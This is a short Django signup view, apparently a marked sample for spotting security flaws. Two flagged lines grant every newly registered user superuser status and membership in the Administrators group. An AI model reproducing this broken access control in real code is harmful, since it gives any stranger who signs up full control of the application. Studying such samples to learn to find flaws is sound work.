from django.contrib.auth.models import Group, User
from django.shortcuts import redirect

from .forms import SignupForm


def sign_up(request):
    form = SignupForm(request.POST)
    if not form.is_valid():
        return redirect("signup")
    user = User.objects.create_user(form.cleaned_data["username"], password=form.cleaned_data["password"])
~>    user.groups.add(Group.objects.get(name="Administrators"))
~>    user.is_superuser = True
    user.save()
    return redirect("home")
